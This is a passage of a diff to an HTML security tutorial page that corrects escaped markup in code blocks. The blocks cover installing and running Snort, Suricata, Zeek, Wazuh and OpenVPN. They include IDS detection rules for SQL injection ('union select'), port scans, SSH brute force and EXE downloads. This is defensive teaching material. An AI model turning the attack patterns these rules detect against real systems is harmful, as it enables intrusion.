-&lt;span class="cmm"&gt;# Check Snort version and build info&lt;/span&gt;
-&lt;span class="fn"&gt;snort&lt;/span&gt; -V
+<span class="cmm"># Check Snort version and build info</span>
+<span class="fn">snort</span> -V
 
-&lt;span class="cmm"&gt;# Test configuration&lt;/span&gt;
-&lt;span class="fn"&gt;snort&lt;/span&gt; -T -c /etc/snort/snort.conf
+<span class="cmm"># Test configuration</span>
+<span class="fn">snort</span> -T -c /etc/snort/snort.conf
 
-&lt;span class="cmm"&gt;# Run Snort in IDS mode&lt;/span&gt;
-&lt;span class="fn"&gt;snort&lt;/span&gt; -c /etc/snort/snort.conf -i eth0
+<span class="cmm"># Run Snort in IDS mode</span>
+<span class="fn">snort</span> -c /etc/snort/snort.conf -i eth0
 
-&lt;span class="cmm"&gt;# Run Snort in packet logger mode&lt;/span&gt;
-&lt;span class="fn"&gt;snort&lt;/span&gt; -l /var/log/snort -b -i eth0
+<span class="cmm"># Run Snort in packet logger mode</span>
+<span class="fn">snort</span> -l /var/log/snort -b -i eth0
 
-&lt;span class="cmm"&gt;# Run Snort in IPS mode (inline)&lt;/span&gt;
-&lt;span class="fn"&gt;snort&lt;/span&gt; -Q --daq afpacket -c /etc/snort/snort.conf -i eth0:eth1
+<span class="cmm"># Run Snort in IPS mode (inline)</span>
+<span class="fn">snort</span> -Q --daq afpacket -c /etc/snort/snort.conf -i eth0:eth1
 
-&lt;span class="cmm"&gt;# Update rules with PulledPork&lt;/span&gt;
-&lt;span class="fn"&gt;pulledpork&lt;/span&gt; -c /etc/snort/pulledpork.conf
+<span class="cmm"># Update rules with PulledPork</span>
+<span class="fn">pulledpork</span> -c /etc/snort/pulledpork.conf
 
-&lt;span class="cmm"&gt;# View alerts&lt;/span&gt;
-&lt;span class="fn"&gt;tail&lt;/span&gt; -f /var/log/snort/alert
-&lt;span class="fn"&gt;snort&lt;/span&gt; -r /var/log/snort/snort.log&lt;/div&gt;
+<span class="cmm"># View alerts</span>
+<span class="fn">tail</span> -f /var/log/snort/alert
+<span class="fn">snort</span> -r /var/log/snort/snort.log</div>
         </div>
         <h3>Writing Snort Rules</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">snort</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Snort rule syntax:&lt;/span&gt;
-&lt;span class="cmm"&gt;# action protocol src_ip src_port -&gt; dst_ip dst_port (msg:"..."; content:"..."; sid:...; rev:...;)&lt;/span&gt;
+          <div class="code-block"><span class="cmm"># Snort rule syntax:</span>
+<span class="cmm"># action protocol src_ip src_port -> dst_ip dst_port (msg:"..."; content:"..."; sid:...; rev:...;)</span>
 
-&lt;span class="cmm"&gt;# Detect SQL injection attempt&lt;/span&gt;
-&lt;span class="kw"&gt;alert&lt;/span&gt; &lt;span class="var"&gt;tcp&lt;/span&gt; &lt;span class="var"&gt;any&lt;/span&gt; &lt;span class="var"&gt;any&lt;/span&gt; -&gt; &lt;span class="var"&gt;any&lt;/span&gt; &lt;span class="var"&gt;80&lt;/span&gt; (&lt;span class="var"&gt;msg&lt;/span&gt;:&lt;span class="str"&gt;"SQL Injection Attempt Detected"&lt;/span&gt;; &lt;span class="var"&gt;content&lt;/span&gt;:&lt;span class="str"&gt;"union select"&lt;/span&gt;; &lt;span class="var"&gt;nocase&lt;/span&gt;; &lt;span class="var"&gt;sid&lt;/span&gt;:&lt;span class="num"&gt;1000001&lt;/span&gt;; &lt;span class="var"&gt;rev&lt;/span&gt;:&lt;span class="num"&gt;1&lt;/span&gt;;)
+<span class="cmm"># Detect SQL injection attempt</span>
+<span class="kw">alert</span> <span class="var">tcp</span> <span class="var">any</span> <span class="var">any</span> -> <span class="var">any</span> <span class="var">80</span> (<span class="var">msg</span>:<span class="str">"SQL Injection Attempt Detected"</span>; <span class="var">content</span>:<span class="str">"union select"</span>; <span class="var">nocase</span>; <span class="var">sid</span>:<span class="num">1000001</span>; <span class="var">rev</span>:<span class="num">1</span>;)
 
-&lt;span class="cmm"&gt;# Detect port scan (SYN flood)&lt;/span&gt;
-&lt;span class="kw"&gt;alert&lt;/span&gt; &lt;span class="var"&gt;tcp&lt;/span&gt; &lt;span class="var"&gt;any&lt;/span&gt; &lt;span class="var"&gt;any&lt;/span&gt; -&gt; &lt;span class="var"&gt;$HOME_NET&lt;/span&gt; &lt;span class="var"&gt;any&lt;/span&gt; (&lt;span class="var"&gt;msg&lt;/span&gt;:&lt;span class="str"&gt;"Port Scan Detected"&lt;/span&gt;; &lt;span class="var"&gt;flags&lt;/span&gt;:&lt;span class="str"&gt;S&lt;/span&gt;; &lt;span class="var"&gt;threshold&lt;/span&gt;: &lt;span class="var"&gt;type&lt;/span&gt; &lt;span class="var"&gt;both&lt;/span&gt;, &lt;span class="var"&gt;track&lt;/span&gt; &lt;span class="var"&gt;by_src&lt;/span&gt;, &lt;span class="var"&gt;count&lt;/span&gt; &lt;span class="num"&gt;50&lt;/span&gt;, &lt;span class="var"&gt;seconds&lt;/span&gt; &lt;span class="num"&gt;60&lt;/span&gt;; &lt;span class="var"&gt;sid&lt;/span&gt;:&lt;span class="num"&gt;1000002&lt;/span&gt;; &lt;span class="var"&gt;rev&lt;/span&gt;:&lt;span class="num"&gt;1&lt;/span&gt;;)
+<span class="cmm"># Detect port scan (SYN flood)</span>
+<span class="kw">alert</span> <span class="var">tcp</span> <span class="var">any</span> <span class="var">any</span> -> <span class="var">$HOME_NET</span> <span class="var">any</span> (<span class="var">msg</span>:<span class="str">"Port Scan Detected"</span>; <span class="var">flags</span>:<span class="str">S</span>; <span class="var">threshold</span>: <span class="var">type</span> <span class="var">both</span>, <span class="var">track</span> <span class="var">by_src</span>, <span class="var">count</span> <span class="num">50</span>, <span class="var">seconds</span> <span class="num">60</span>; <span class="var">sid</span>:<span class="num">1000002</span>; <span class="var">rev</span>:<span class="num">1</span>;)
 
-&lt;span class="cmm"&gt;# Detect SSH brute force&lt;/span&gt;
-&lt;span class="kw"&gt;alert&lt;/span&gt; &lt;span class="var"&gt;tcp&lt;/span&gt; &lt;span class="var"&gt;any&lt;/span&gt; &lt;span class="var"&gt;any&lt;/span&gt; -&gt; &lt;span class="var"&gt;$HOME_NET&lt;/span&gt; &lt;span class="var"&gt;22&lt;/span&gt; (&lt;span class="var"&gt;msg&lt;/span&gt;:&lt;span class="str"&gt;"SSH Brute Force Attempt"&lt;/span&gt;; &lt;span class="var"&gt;flow&lt;/span&gt;:&lt;span class="var"&gt;to_server&lt;/span&gt;,&lt;span class="var"&gt;established&lt;/span&gt;; &lt;span class="var"&gt;content&lt;/span&gt;:&lt;span class="str"&gt;"SSH-"&lt;/span&gt;; &lt;span class="var"&gt;threshold&lt;/span&gt;: &lt;span class="var"&gt;type&lt;/span&gt; &lt;span class="var"&gt;both&lt;/span&gt;, &lt;span class="var"&gt;track&lt;/span&gt; &lt;span class="var"&gt;by_src&lt;/span&gt;, &lt;span class="var"&gt;count&lt;/span&gt; &lt;span class="num"&gt;5&lt;/span&gt;, &lt;span class="var"&gt;seconds&lt;/span&gt; &lt;span class="num"&gt;60&lt;/span&gt;; &lt;span class="var"&gt;sid&lt;/span&gt;:&lt;span class="num"&gt;1000003&lt;/span&gt;; &lt;span class="var"&gt;rev&lt;/span&gt;:&lt;span class="num"&gt;1&lt;/span&gt;;)&lt;/div&gt;
+<span class="cmm"># Detect SSH brute force</span>
+<span class="kw">alert</span> <span class="var">tcp</span> <span class="var">any</span> <span class="var">any</span> -> <span class="var">$HOME_NET</span> <span class="var">22</span> (<span class="var">msg</span>:<span class="str">"SSH Brute Force Attempt"</span>; <span class="var">flow</span>:<span class="var">to_server</span>,<span class="var">established</span>; <span class="var">content</span>:<span class="str">"SSH-"</span>; <span class="var">threshold</span>: <span class="var">type</span> <span class="var">both</span>, <span class="var">track</span> <span class="var">by_src</span>, <span class="var">count</span> <span class="num">5</span>, <span class="var">seconds</span> <span class="num">60</span>; <span class="var">sid</span>:<span class="num">1000003</span>; <span class="var">rev</span>:<span class="num">1</span>;)</div>
         </div>
       </section>
 
@@ -1357,33 +1357,33 @@ EOF
         <p><strong>Suricata</strong> is a high-performance Network IDS, IPS, and Network Security Monitoring engine. It is multi-threaded, supports GPU acceleration, and can process multiple gigabits of traffic per second. Suricata is compatible with Snort rules while offering additional features.</p>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Install Suricata&lt;/span&gt;
-&lt;span class="fn"&gt;apt&lt;/span&gt; install suricata
+          <div class="code-block"><span class="cmm"># Install Suricata</span>
+<span class="fn">apt</span> install suricata
 
-&lt;span class="cmm"&gt;# Update rules with Suricata-Update&lt;/span&gt;
-&lt;span class="fn"&gt;suricata-update&lt;/span&gt;
-&lt;span class="fn"&gt;suricata-update&lt;/span&gt; list-sources
-&lt;span class="fn"&gt;suricata-update&lt;/span&gt; enable-source et/open
-&lt;span class="fn"&gt;suricata-update&lt;/span&gt;
+<span class="cmm"># Update rules with Suricata-Update</span>
+<span class="fn">suricata-update</span>
+<span class="fn">suricata-update</span> list-sources
+<span class="fn">suricata-update</span> enable-source et/open
+<span class="fn">suricata-update</span>
 
-&lt;span class="cmm"&gt;# Test configuration&lt;/span&gt;
-&lt;span class="fn"&gt;suricata&lt;/span&gt; -T -c /etc/suricata/suricata.yaml
+<span class="cmm"># Test configuration</span>
+<span class="fn">suricata</span> -T -c /etc/suricata/suricata.yaml
 
-&lt;span class="cmm"&gt;# Run Suricata in IDS mode&lt;/span&gt;
-&lt;span class="fn"&gt;suricata&lt;/span&gt; -c /etc/suricata/suricata.yaml -i eth0
+<span class="cmm"># Run Suricata in IDS mode</span>
+<span class="fn">suricata</span> -c /etc/suricata/suricata.yaml -i eth0
 
-&lt;span class="cmm"&gt;# Run Suricata in IPS mode (inline with NFQUEUE)&lt;/span&gt;
-&lt;span class="fn"&gt;suricata&lt;/span&gt; -c /etc/suricata/suricata.yaml -q 0
+<span class="cmm"># Run Suricata in IPS mode (inline with NFQUEUE)</span>
+<span class="fn">suricata</span> -c /etc/suricata/suricata.yaml -q 0
 
-&lt;span class="cmm"&gt;# Process a PCAP file&lt;/span&gt;
-&lt;span class="fn"&gt;suricata&lt;/span&gt; -r capture.pcap -c /etc/suricata/suricata.yaml
+<span class="cmm"># Process a PCAP file</span>
+<span class="fn">suricata</span> -r capture.pcap -c /etc/suricata/suricata.yaml
 
-&lt;span class="cmm"&gt;# View alerts&lt;/span&gt;
-&lt;span class="fn"&gt;tail&lt;/span&gt; -f /var/log/suricata/fast.log
-&lt;span class="fn"&gt;cat&lt;/span&gt; /var/log/suricata/eve.json | jq '.'
+<span class="cmm"># View alerts</span>
+<span class="fn">tail</span> -f /var/log/suricata/fast.log
+<span class="fn">cat</span> /var/log/suricata/eve.json | jq '.'
 
-&lt;span class="cmm"&gt;# Generate stats&lt;/span&gt;
-&lt;span class="fn"&gt;suricatasc&lt;/span&gt; -c dump-counters&lt;/div&gt;
+<span class="cmm"># Generate stats</span>
+<span class="fn">suricatasc</span> -c dump-counters</div>
         </div>
         <h3>Suricata Features Beyond Snort</h3>
         <ul>
@@ -1396,11 +1396,11 @@ EOF
         </ul>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">suricata</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Suricata rule with file extraction&lt;/span&gt;
-&lt;span class="kw"&gt;alert&lt;/span&gt; &lt;span class="var"&gt;http&lt;/span&gt; &lt;span class="var"&gt;any&lt;/span&gt; &lt;span class="var"&gt;any&lt;/span&gt; -&gt; &lt;span class="var"&gt;any&lt;/span&gt; &lt;span class="var"&gt;any&lt;/span&gt; (&lt;span class="var"&gt;msg&lt;/span&gt;:&lt;span class="str"&gt;"EXE Download Detected"&lt;/span&gt;; &lt;span class="var"&gt;file.name&lt;/span&gt;; &lt;span class="var"&gt;content&lt;/span&gt;:&lt;span class="str"&gt;".exe"&lt;/span&gt;; &lt;span class="var"&gt;file.store&lt;/span&gt;; &lt;span class="var"&gt;sid&lt;/span&gt;:&lt;span class="num"&gt;2000001&lt;/span&gt;; &lt;span class="var"&gt;rev&lt;/span&gt;:&lt;span class="num"&gt;1&lt;/span&gt;;)
+          <div class="code-block"><span class="cmm"># Suricata rule with file extraction</span>
+<span class="kw">alert</span> <span class="var">http</span> <span class="var">any</span> <span class="var">any</span> -> <span class="var">any</span> <span class="var">any</span> (<span class="var">msg</span>:<span class="str">"EXE Download Detected"</span>; <span class="var">file.name</span>; <span class="var">content</span>:<span class="str">".exe"</span>; <span class="var">file.store</span>; <span class="var">sid</span>:<span class="num">2000001</span>; <span class="var">rev</span>:<span class="num">1</span>;)
 
-&lt;span class="cmm"&gt;# TLS fingerprinting rule&lt;/span&gt;
-&lt;span class="kw"&gt;alert&lt;/span&gt; &lt;span class="var"&gt;tls&lt;/span&gt; &lt;span class="var"&gt;any&lt;/span&gt; &lt;span class="var"&gt;any&lt;/span&gt; -&gt; &lt;span class="var"&gt;any&lt;/span&gt; &lt;span class="var"&gt;any&lt;/span&gt; (&lt;span class="var"&gt;msg&lt;/span&gt;:&lt;span class="str"&gt;"Suspicious JA3 Fingerprint"&lt;/span&gt;; &lt;span class="var"&gt;ja3.hash&lt;/span&gt;; &lt;span class="var"&gt;content&lt;/span&gt;:&lt;span class="str"&gt;"e7d705a00be9e9d5a7e9d5a7e9d5a7e9"&lt;/span&gt;; &lt;span class="var"&gt;sid&lt;/span&gt;:&lt;span class="num"&gt;2000002&lt;/span&gt;; &lt;span class="var"&gt;rev&lt;/span&gt;:&lt;span class="num"&gt;1&lt;/span&gt;;)&lt;/div&gt;
+<span class="cmm"># TLS fingerprinting rule</span>
+<span class="kw">alert</span> <span class="var">tls</span> <span class="var">any</span> <span class="var">any</span> -> <span class="var">any</span> <span class="var">any</span> (<span class="var">msg</span>:<span class="str">"Suspicious JA3 Fingerprint"</span>; <span class="var">ja3.hash</span>; <span class="var">content</span>:<span class="str">"e7d705a00be9e9d5a7e9d5a7e9d5a7e9"</span>; <span class="var">sid</span>:<span class="num">2000002</span>; <span class="var">rev</span>:<span class="num">1</span>;)</div>
         </div>
       </section>
 
@@ -1411,50 +1411,50 @@ EOF
         <p><strong>Zeek</strong> is a passive, open-source network traffic analyzer. Unlike traditional IDS systems that focus on signature matching, Zeek extracts high-level semantic information from network traffic, producing detailed logs for security monitoring and forensics.</p>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Install Zeek&lt;/span&gt;
-&lt;span class="fn"&gt;apt&lt;/span&gt; install zeek
+          <div class="code-block"><span class="cmm"># Install Zeek</span>
+<span class="fn">apt</span> install zeek
 
-&lt;span class="cmm"&gt;# Run Zeek on a live interface&lt;/span&gt;
-&lt;span class="fn"&gt;zeek&lt;/span&gt; -i eth0
+<span class="cmm"># Run Zeek on a live interface</span>
+<span class="fn">zeek</span> -i eth0
 
-&lt;span class="cmm"&gt;# Process a PCAP file&lt;/span&gt;
-&lt;span class="fn"&gt;zeek&lt;/span&gt; -r capture.pcap
+<span class="cmm"># Process a PCAP file</span>
+<span class="fn">zeek</span> -r capture.pcap
 
-&lt;span class="cmm"&gt;# View generated logs&lt;/span&gt;
-&lt;span class="fn"&gt;ls&lt;/span&gt; *.log
-&lt;span class="fn"&gt;cat&lt;/span&gt; conn.log | &lt;span class="fn"&gt;zeek-cut&lt;/span&gt; id.orig_h id.resp_h service
-&lt;span class="fn"&gt;cat&lt;/span&gt; http.log | &lt;span class="fn"&gt;zeek-cut&lt;/span&gt; host uri status_code
-&lt;span class="fn"&gt;cat&lt;/span&gt; dns.log | &lt;span class="fn"&gt;zeek-cut&lt;/span&gt; query answers
-&lt;span class="fn"&gt;cat&lt;/span&gt; ssl.log | &lt;span class="fn"&gt;zeek-cut&lt;/span&gt; server_name ja3
+<span class="cmm"># View generated logs</span>
+<span class="fn">ls</span> *.log
+<span class="fn">cat</span> conn.log | <span class="fn">zeek-cut</span> id.orig_h id.resp_h service
+<span class="fn">cat</span> http.log | <span class="fn">zeek-cut</span> host uri status_code
+<span class="fn">cat</span> dns.log | <span class="fn">zeek-cut</span> query answers
+<span class="fn">cat</span> ssl.log | <span class="fn">zeek-cut</span> server_name ja3
 
-&lt;span class="cmm"&gt;# Zeek script to detect SSH brute force&lt;/span&gt;
-&lt;span class="cmm"&gt;# Save as ssh-bruteforce.zeek:&lt;/span&gt;
-&lt;span class="kw"&gt;@load&lt;/span&gt; base/protocols/ssh
-&lt;span class="kw"&gt;@load&lt;/span&gt; base/frameworks/notice
+<span class="cmm"># Zeek script to detect SSH brute force</span>
+<span class="cmm"># Save as ssh-bruteforce.zeek:</span>
+<span class="kw">@load</span> base/protocols/ssh
+<span class="kw">@load</span> base/frameworks/notice
 
-&lt;span class="kw"&gt;module&lt;/span&gt; SSH;
+<span class="kw">module</span> SSH;
 
-&lt;span class="kw"&gt;export&lt;/span&gt; {
-    &lt;span class="kw"&gt;redef&lt;/span&gt; &lt;span class="var"&gt;enum&lt;/span&gt; Notice::Type += {
+<span class="kw">export</span> {
+    <span class="kw">redef</span> <span class="var">enum</span> Notice::Type += {
         SSH::BruteForceAttempt
     };
-    &lt;span class="kw"&gt;const&lt;/span&gt; ssh_brute_force_limit = &lt;span class="num"&gt;5&lt;/span&gt; &redef;
+    <span class="kw">const</span> ssh_brute_force_limit = <span class="num">5</span> &redef;
 }
 
-&lt;span class="kw"&gt;global&lt;/span&gt; ssh_attempts: &lt;span class="kw"&gt;table&lt;/span&gt;[&lt;span class="var"&gt;addr&lt;/span&gt;] &lt;span class="kw"&gt;of&lt;/span&gt; &lt;span class="var"&gt;count&lt;/span&gt; &default=&lt;span class="num"&gt;0&lt;/span&gt; &write_expire=&lt;span class="num"&gt;5min&lt;/span&gt;;
+<span class="kw">global</span> ssh_attempts: <span class="kw">table</span>[<span class="var">addr</span>] <span class="kw">of</span> <span class="var">count</span> &default=<span class="num">0</span> &write_expire=<span class="num">5min</span>;
 
-&lt;span class="kw"&gt;event&lt;/span&gt; ssh_auth_failed(c: &lt;span class="var"&gt;connection&lt;/span&gt;)
+<span class="kw">event</span> ssh_auth_failed(c: <span class="var">connection</span>)
 {
-    &lt;span class="kw"&gt;local&lt;/span&gt; orig = c$id$orig_h;
-    ssh_attempts[orig] += &lt;span class="num"&gt;1&lt;/span&gt;;
-    &lt;span class="kw"&gt;if&lt;/span&gt; (ssh_attempts[orig] &gt;= ssh_brute_force_limit)
+    <span class="kw">local</span> orig = c$id$orig_h;
+    ssh_attempts[orig] += <span class="num">1</span>;
+    <span class="kw">if</span> (ssh_attempts[orig] >= ssh_brute_force_limit)
     {
         NOTICE([$note=SSH::BruteForceAttempt,
-                $msg=fmt(&lt;span class="str"&gt;"SSH brute force from %s (%d attempts)"&lt;/span&gt;, orig, ssh_attempts[orig]),
+                $msg=fmt(<span class="str">"SSH brute force from %s (%d attempts)"</span>, orig, ssh_attempts[orig]),
                 $src=orig,
                 $identifier=cat(orig)]);
     }
-}&lt;/div&gt;
+}</div>
         </div>
         <h3>Zeek Log Files</h3>
         <table class="data-table">
@@ -1501,28 +1501,28 @@ EOF
         <h3>Wazuh — Open Source SIEM/XDR</h3>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Install Wazuh server (using the quickstart script)&lt;/span&gt;
-&lt;span class="fn"&gt;curl&lt;/span&gt; -sO https://packages.wazuh.com/4.7/wazuh-install.sh
-&lt;span class="fn"&gt;bash&lt;/span&gt; wazuh-install.sh -a
+          <div class="code-block"><span class="cmm"># Install Wazuh server (using the quickstart script)</span>
+<span class="fn">curl</span> -sO https://packages.wazuh.com/4.7/wazuh-install.sh
+<span class="fn">bash</span> wazuh-install.sh -a
 
-&lt;span class="cmm"&gt;# Install Wazuh agent on a Linux endpoint&lt;/span&gt;
-&lt;span class="fn"&gt;wget&lt;/span&gt; https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.7.0-1_amd64.deb
-&lt;span class="fn"&gt;dpkg&lt;/span&gt; -i wazuh-agent_4.7.0-1_amd64.deb
+<span class="cmm"># Install Wazuh agent on a Linux endpoint</span>
+<span class="fn">wget</span> https://packages.wazuh.com/4.x/apt/pool/main/w/wazuh-agent/wazuh-agent_4.7.0-1_amd64.deb
+<span class="fn">dpkg</span> -i wazuh-agent_4.7.0-1_amd64.deb
 
-&lt;span class="cmm"&gt;# Configure agent&lt;/span&gt;
-&lt;span class="fn"&gt;sed&lt;/span&gt; -i &lt;span class="str"&gt;'s/MANAGER_IP/192.168.1.10/'&lt;/span&gt; /var/ossec/etc/ossec.conf
-&lt;span class="fn"&gt;systemctl&lt;/span&gt; restart wazuh-agent
+<span class="cmm"># Configure agent</span>
+<span class="fn">sed</span> -i <span class="str">'s/MANAGER_IP/192.168.1.10/'</span> /var/ossec/etc/ossec.conf
+<span class="fn">systemctl</span> restart wazuh-agent
 
-&lt;span class="cmm"&gt;# View Wazuh logs&lt;/span&gt;
-&lt;span class="fn"&gt;cat&lt;/span&gt; /var/ossec/logs/alerts/alerts.json | jq '.'
+<span class="cmm"># View Wazuh logs</span>
+<span class="fn">cat</span> /var/ossec/logs/alerts/alerts.json | jq '.'
 
-&lt;span class="cmm"&gt;# Custom rules in /var/ossec/etc/rules/local_rules.xml&lt;/span&gt;
-&lt;span class="cmm"&gt;# Example: Detect failed sudo attempts&lt;/span&gt;
-&lt;&lt;span class="kw"&gt;rule&lt;/span&gt; &lt;span class="var"&gt;id&lt;/span&gt;=&lt;span class="str"&gt;"100001"&lt;/span&gt; &lt;span class="var"&gt;level&lt;/span&gt;=&lt;span class="str"&gt;"10"&lt;/span&gt;&gt;
-  &lt;&lt;span class="kw"&gt;if_sid&lt;/span&gt;&gt;5402&lt;/&lt;span class="kw"&gt;if_sid&lt;/span&gt;&gt;
-  &lt;&lt;span class="kw"&gt;match&lt;/span&gt;&gt;authentication failure&lt;/&lt;span class="kw"&gt;match&lt;/span&gt;&gt;
-  &lt;&lt;span class="kw"&gt;description&lt;/span&gt;&gt;Multiple sudo authentication failures&lt;/&lt;span class="kw"&gt;description&lt;/span&gt;&gt;
-&lt;/&lt;span class="kw"&gt;rule&lt;/span&gt;&gt;&lt;/div&gt;
+<span class="cmm"># Custom rules in /var/ossec/etc/rules/local_rules.xml</span>
+<span class="cmm"># Example: Detect failed sudo attempts</span>
+&lt;<span class="kw">rule</span> <span class="var">id</span>=<span class="str">"100001"</span> <span class="var">level</span>=<span class="str">"10"</span>&gt;
+  &lt;<span class="kw">if_sid</span>&gt;5402&lt;/<span class="kw">if_sid</span>&gt;
+  &lt;<span class="kw">match</span>&gt;authentication failure&lt;/<span class="kw">match</span>&gt;
+  &lt;<span class="kw">description</span>&gt;Multiple sudo authentication failures&lt;/<span class="kw">description</span>&gt;
+&lt;/<span class="kw">rule</span>&gt;</div>
         </div>
       </section>
 
@@ -1562,55 +1562,55 @@ EOF
         <p><strong>OpenVPN</strong> is an open-source VPN solution that uses SSL/TLS for key exchange and can traverse NATs and firewalls. It's highly configurable, cross-platform, and widely deployed.</p>
         <div class="code-container">
           <div class="code-header"><span class="lang-label">bash</span><button class="code-copy" onclick="copyCode(this)">Copy</button></div>
-          &lt;div class="code-block"&gt;&lt;span class="cmm"&gt;# Install OpenVPN and Easy-RSA&lt;/span&gt;
-&lt;span class="fn"&gt;apt&lt;/span&gt; install openvpn easy-rsa
+          <div class="code-block"><span class="cmm"># Install OpenVPN and Easy-RSA</span>
+<span class="fn">apt</span> install openvpn easy-rsa
 
-&lt;span class="cmm"&gt;# Set up PKI with Easy-RSA&lt;/span&gt;
-&lt;span class="fn"&gt;make-cadir&lt;/span&gt; ~/openvpn-ca
-&lt;span class="fn"&gt;cd&lt;/span&gt; ~/openvpn-ca
-&lt;span class="fn"&gt;./easyrsa&lt;/span&gt; init-pki
-&lt;span class="fn"&gt;./easyrsa&lt;/span&gt; build-ca nopass
+<span class="cmm"># Set up PKI with Easy-RSA</span>
+<span class="fn">make-cadir</span> ~/openvpn-ca
+<span class="fn">cd</span> ~/openvpn-ca
+<span class="fn">./easyrsa</span> init-pki
+<span class="fn">./easyrsa</span> build-ca nopass
 
-&lt;span class="cmm"&gt;# Generate server certificate&lt;/span&gt;
-&lt;span class="fn"&gt;./easyrsa&lt;/span&gt; gen-req server nopass
-&lt;span class="fn"&gt;./easyrsa&lt;/span&gt; sign-req server server
+<span class="cmm"># Generate server certificate</span>
+<span class="fn">./easyrsa</span> gen-req server nopass
+<span class="fn">./easyrsa</span> sign-req server server
 
-&lt;span class="cmm"&gt;# Generate Diffie-Hellman parameters&lt;/span&gt;
-&lt;span class="fn"&gt;./easyrsa&lt;/span&gt; gen-dh
+<span class="cmm"># Generate Diffie-Hellman parameters</span>
+<span class="fn">./easyrsa</span> gen-dh
 
-&lt;span class="cmm"&gt;# Generate client certificate&lt;/span&gt;
-&lt;span class="fn"&gt;./easyrsa&lt;/span&gt; gen-req client1 nopass
-&lt;span class="fn"&gt;./easyrsa&lt;/span&gt; sign-req client client1
+<span class="cmm"># Generate client certificate</span>
+<span class="fn">./easyrsa</span> gen-req client1 nopass
+<span class="fn">./easyrsa</span> sign-req client client1
 
-&lt;span class="cmm"&gt;# Generate TLS auth key&lt;/span&gt;
-&lt;span class="fn"&gt;openvpn&lt;/span&gt; --genkey secret ta.key
+<span class="cmm"># Generate TLS auth key</span>
+<span class="fn">openvpn</span> --genkey secret ta.key
 
-&lt;span class="cmm"&gt;# Server configuration (/etc/openvpn/server.conf)&lt;/span&gt;
-&lt;span class="kw"&gt;port&lt;/span&gt; &lt;span class="num"&gt;1194&lt;/span&gt;
-&lt;span class="kw"&gt;proto&lt;/span&gt; &lt;span class="var"&gt;udp&lt;/span&gt;
-&lt;span class="kw"&gt;dev&lt;/span&gt; &lt;span class="var"&gt;tun&lt;/span&gt;
-&lt;span class="kw"&gt;ca&lt;/span&gt; &lt;span class="var"&gt;ca.crt&lt;/span&gt;
-&lt;span class="kw"&gt;cert&lt;/span&gt; &lt;span class="var"&gt;server.crt&lt;/span&gt;
-&lt;span class="kw"&gt;key&lt;/span&gt; &lt;span class="var"&gt;server.key&lt;/span&gt;
-&lt;span class="kw"&gt;dh&lt;/span&gt; &lt;span class="var"&gt;dh.pem&lt;/span&gt;
-&lt;span class="kw"&gt;server&lt;/span&gt; &lt;span class="num"&gt;10.8.0.0&lt;/span&gt; &lt;span class="num"&gt;255.255.255.0&lt;/span&gt;
-&lt;span class="kw"&gt;push&lt;/span&gt; &lt;span class="str"&gt;"redirect-gateway def1 bypass-dhcp"&lt;/span&gt;
-&lt;span class="kw"&gt;push&lt;/span&gt; &lt;span class="str"&gt;"dhcp-option DNS 8.8.8.8"&lt;/span&gt;
-&lt;span class="kw"&gt;tls-auth&lt;/span&gt; &lt;span class="var"&gt;ta.key&lt;/span&gt; &lt;span class="num"&gt;0&lt;/span&gt;
-&lt;span class="kw"&gt;cipher&lt;/span&gt; &lt;span class="var"&gt;AES-256-GCM&lt;/span&gt;
-&lt;span class="kw"&gt;auth&lt;/span&gt; &lt;span class="var"&gt;SHA256&lt;/span&gt;
-&lt;span class="kw"&gt;user&lt;/span&gt; &lt;span class="var"&gt;nobody&lt;/span&gt;
-&lt;span class="kw"&gt;group&lt;/span&gt; &lt;span class="var"&gt;nogroup&lt;/span&gt;
-&lt;span class="kw"&gt;persist-key&lt;/span&gt;
-&lt;span class="kw"&gt;persist-tun&lt;/span&gt;
-&lt;span class="kw"&gt;status&lt;/span&gt; &lt;span class="var"&gt;openvpn-status.log&lt;/span&gt;
-&lt;span class="kw"&gt;verb&lt;/span&gt; &lt;span class="num"&gt;3&lt;/span&gt;
+<span class="cmm"># Server configuration (/etc/openvpn/server.conf)</span>
+<span class="kw">port</span> <span class="num">1194</span>
+<span class="kw">proto</span> <span class="var">udp</span>
+<span class="kw">dev</span> <span class="var">tun</span>
+<span class="kw">ca</span> <span class="var">ca.crt</span>
+<span class="kw">cert</span> <span class="var">server.crt</span>
+<span class="kw">key</span> <span class="var">server.key</span>
+<span class="kw">dh</span> <span class="var">dh.pem</span>
+<span class="kw">server</span> <span class="num">10.8.0.0</span> <span class="num">255.255.255.0</span>
+<span class="kw">push</span> <span class="str">"redirect-gateway def1 bypass-dhcp"</span>
+<span class="kw">push</span> <span class="str">"dhcp-option DNS 8.8.8.8"</span>
+<span class="kw">tls-auth</span> <span class="var">ta.key</span> <span class="num">0</span>
+<span class="kw">cipher</span> <span class="var">AES-256-GCM</span>
+<span class="kw">auth</span> <span class="var">SHA256</span>
+<span class="kw">user</span> <span class="var">nobody</span>
+<span class="kw">group</span> <span class="var">nogroup</span>
+<span class="kw">persist-key</span>
+<span class="kw">persist-tun</span>
+<span class="kw">status</span> <span class="var">openvpn-status.log</span>
+<span class="kw">verb</span> <span class="num">3</span>
 
-&lt;span class="cmm"&gt;# Start OpenVPN server&lt;/span&gt;
-&lt;span class="fn"&gt;systemctl&lt;/span&gt; enable --now openvpn@server
+<span class="cmm"># Start OpenVPN server</span>
+<span class="fn">systemctl</span> enable --now openvpn@server
 
-&lt;span class="cmm"&gt;# Generate client config (.ovpn file)&lt;/span&gt;
-&lt;span class="fn"&gt;cat&lt;/span&gt; &lt;&lt; EOF &gt; client1.ovpn
+<span class="cmm"># Generate client config (.ovpn file)</span>
